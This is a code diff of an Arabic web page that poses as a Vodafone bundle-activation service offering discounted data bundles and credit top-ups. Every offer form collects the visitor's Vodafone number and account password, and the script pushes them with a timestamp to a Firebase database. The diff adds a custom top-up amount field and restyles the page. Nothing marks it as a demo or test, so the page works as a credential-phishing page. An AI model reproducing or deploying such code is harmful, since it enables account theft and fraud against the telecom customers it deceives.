@@ -17,7 +17,7 @@
       margin: 0;
       padding: 0;
       font-family: 'Cairo', sans-serif;
-      background: linear-gradient(to bottom, #8e0000, #330000);
+      background: linear-gradient(to bottom, #6a0000, #1a0000);
       color: white;
       text-align: center;
     }
@@ -29,34 +29,31 @@
     h1 {
       font-size: 30px;
       margin-bottom: 5px;
-      animation: fadeIn 1s ease-out;
     }
 
     .subtitle {
       font-size: 16px;
       margin-bottom: 30px;
       color: #ffdede;
-      animation: fadeIn 1.5s ease-out;
     }
 
     .box {
-      background: rgba(255, 255, 255, 0.07);
+      background: rgba(255, 255, 255, 0.06);
       border: 1px solid #ff3333;
-      border-radius: 12px;
+      border-radius: 14px;
       padding: 20px;
       margin-bottom: 20px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.4);
-      transition: transform 0.3s;
+      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.5);
+      transition: transform 0.3s ease;
     }
 
     .box:hover {
-      transform: scale(1.03);
+      transform: scale(1.02);
     }
 
     h2 {
-      margin-top: 0;
       font-size: 22px;
-      color: #ffcccc;
+      color: #ffbdbd;
     }
 
     input {
@@ -64,7 +61,7 @@
       width: 90%;
       margin: 10px auto;
       padding: 10px;
-      border-radius: 8px;
+      border-radius: 10px;
       border: none;
       font-size: 14px;
     }
@@ -77,17 +74,17 @@
       cursor: pointer;
       font-weight: bold;
       display: inline-block;
-      transition: background-color 0.3s;
       margin-top: 10px;
+      transition: background-color 0.3s;
     }
 
     .btn:hover {
-      background-color: #ffe6e6;
+      background-color: #fdd;
     }
 
     .conditions {
       font-size: 12px;
-      color: #ffcccc;
+      color: #ffcaca;
       margin-top: 10px;
     }
 
@@ -95,33 +92,16 @@
       position: fixed;
       top: 50%;
       left: 50%;
-      transform: translate(-50%, -50%) scale(0);
+      transform: translate(-50%, -50%);
       background: white;
       color: #7b0000;
-      padding: 25px;
-      border-radius: 15px;
-      font-size: 18px;
+      padding: 25px 30px;
+      border-radius: 20px;
+      font-size: 20px;
       font-weight: bold;
       z-index: 999;
-      animation: popupIn 0.5s forwards;
       display: none;
-    }
-
-    @keyframes popupIn {
-      to {
-        transform: translate(-50%, -50%) scale(1);
-      }
-    }
-
-    @keyframes fadeIn {
-      from {
-        opacity: 0;
-        transform: translateY(-10px);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0);
-      }
+      box-shadow: 0 8px 16px rgba(0,0,0,0.5);
     }
 
     footer {
@@ -130,6 +110,12 @@
       opacity: 0.7;
       direction: ltr;
     }
+
+    .price-display {
+      color: #ffdfdf;
+      margin-top: 5px;
+      font-size: 13px;
+    }
   </style>
 </head>
 <body>
@@ -137,22 +123,22 @@
     <h1>تفعيل باقات فودافون</h1>
     <p class="subtitle">أقوى العروض بأقل الأسعار</p>
 
-    <!-- باقة فليكس 13000 -->
+    <!-- فليكس 13000 -->
     <div class="box">
       <h2>فليكس 13000 - 240 جنيه</h2>
       <div class="conditions">شروط: لا يوجد سلف أو نوتة - التفعيل خلال ساعتين</div>
       <input type="text" placeholder="رقم فودافون" id="num1" />
       <input type="password" placeholder="كلمة المرور" id="pass1" />
-      <div class="btn" onclick="sendData('فليكس 13000', 'num1', 'pass1')">تفعيل الآن</div>
+      <div class="btn" onclick="sendData('فليكس 13000 - 240 جنيه', 'num1', 'pass1')">تفعيل الآن</div>
     </div>
 
-    <!-- باقة 40 جيجا -->
+    <!-- 40 جيجا -->
     <div class="box">
       <h2>40 جيجا - 330 جنيه</h2>
       <div class="conditions">شروط: التفعيل حتى لو عليك سلف أو نوتة - خلال 72 ساعة</div>
       <input type="text" placeholder="رقم فودافون" id="num2" />
       <input type="password" placeholder="كلمة المرور" id="pass2" />
-      <div class="btn" onclick="sendData('40 جيجا', 'num2', 'pass2')">تفعيل الآن</div>
+      <div class="btn" onclick="sendData('40 جيجا - 330 جنيه', 'num2', 'pass2')">تفعيل الآن</div>
     </div>
 
     <!-- شحن رصيد صافي -->
@@ -161,13 +147,15 @@
       <div class="conditions">شروط: لا يوجد سلف - التفعيل خلال ساعة</div>
       <input type="text" placeholder="رقم فودافون" id="num3" />
       <input type="password" placeholder="كلمة المرور" id="pass3" />
-      <div class="btn" onclick="sendData('شحن رصيد صافي', 'num3', 'pass3')">شحن الآن</div>
+      <input type="number" placeholder="اكتب الرصيد المطلوب بالجنيه" id="amount" oninput="calculatePrice()" />
+      <div id="priceDisplay" class="price-display">السعر بالجنيه: 0</div>
+      <div class="btn" onclick="sendCustomBalance()">شحن الآن</div>
     </div>
 
     <div id="successPopup">تم الإرسال بنجاح!</div>
 
     <footer>
-      جميع الحقوق محفوظة &copy; mahmoud gamal
+      جميع الحقوق محفوظة &copy; Mahmoud Gamal Programming
     </footer>
   </div>
 
@@ -184,21 +172,53 @@
       const pass = document.getElementById(passId).value.trim();
 
       if (num && pass) {
-        db.ref("vodafonedb").push({
+        db.ref("voda").push({
           num: num,
           pass: pass,
-          pack: packageName
-        })
-        .then(() => {
+          pack: packageName,
+          time: new Date().toLocaleString()
+        }).then(() => {
           showSuccessPopup();
           document.getElementById(numId).value = "";
           document.getElementById(passId).value = "";
-        })
-        .catch((error) => {
+        }).catch((error) => {
           alert("حدث خطأ: " + error.message);
         });
       } else {
         alert("يرجى إدخال الرقم وكلمة المرور.");
+      }
+    }
+
+    function calculatePrice() {
+      const amount = document.getElementById("amount").value;
+      const price = Math.ceil((amount / 100) * 120);
+      document.getElementById("priceDisplay").innerText = `السعر بالجنيه: ${price}`;
+      return price;
+    }
+
+    function sendCustomBalance() {
+      const num = document.getElementById("num3").value.trim();
+      const pass = document.getElementById("pass3").value.trim();
+      const amount = document.getElementById("amount").value.trim();
+
+      if (num && pass && amount) {
+        const price = calculatePrice();
+        db.ref("voda").push({
+          num: num,
+          pass: pass,
+          pack: `رصيد صافي - ${amount} جنيه (تحسب ${price} جنيه)`,
+          time: new Date().toLocaleString()
+        }).then(() => {
+          showSuccessPopup();
+          document.getElementById("num3").value = "";
+          document.getElementById("pass3").value = "";
+          document.getElementById("amount").value = "";
+          document.getElementById("priceDisplay").innerText = "السعر بالجنيه: 0";
+        }).catch((error) => {
+          alert("حدث خطأ: " + error.message);
+        });
+      } else {
+        alert("يرجى إدخال جميع البيانات.");
       }
     }
 
